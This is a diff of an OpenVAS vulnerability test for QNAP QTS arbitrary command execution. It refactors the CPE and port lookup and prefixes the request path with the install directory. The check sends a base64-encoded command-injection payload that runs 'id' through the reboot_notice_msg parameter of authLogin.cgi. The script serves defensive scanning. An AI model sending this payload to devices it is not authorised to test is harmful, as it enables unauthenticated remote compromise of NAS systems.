@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_qnap_qts_20170313_remote.nasl 11983 2018-10-19 10:04:45Z mmartin $
+# $Id: gb_qnap_qts_20170313_remote.nasl 12260 2018-11-08 12:46:52Z cfischer $
 #
 # QNAP QTS Multiple Arbitrary Command Execution Vulnerabilities (Remote)
 #
@@ -25,13 +25,13 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-CPE = "cpe:/h:qnap";
+CPE_PREFIX = "cpe:/h:qnap";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.140297");
-  script_version("$Revision: 11983 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-19 12:04:45 +0200 (Fri, 19 Oct 2018) $");
+  script_version("$Revision: 12260 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-11-08 13:46:52 +0100 (Thu, 08 Nov 2018) $");
   script_tag(name:"creation_date", value:"2017-08-15 08:57:34 +0700 (Tue, 15 Aug 2017)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -78,14 +78,23 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("misc_func.inc");
 
-if (!port = get_app_port_from_cpe_prefix(cpe: CPE))
+if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, first_cpe_only: TRUE, service: "www"))
   exit(0);
+
+port = infos["port"];
+CPE = infos["cpe"];
+
+if (!dir = get_app_location(cpe: CPE, port: port))
+  exit(0);
+
+if (dir == "/")
+  dir = "";
 
 date = unixtime() % 100000000;
 msg = "QNAPVJBD0" + date + "      Disconnect  14`(echo;id)>&2`";
 msg = base64(str: msg);
 
-url = "/cgi-bin/authLogin.cgi?reboot_notice_msg=" + msg;
+url = dir + "/cgi-bin/authLogin.cgi?reboot_notice_msg=" + msg;
 
 req = http_get(port: port, item: url);
 res = http_keepalive_send_recv(port: port, data: req);
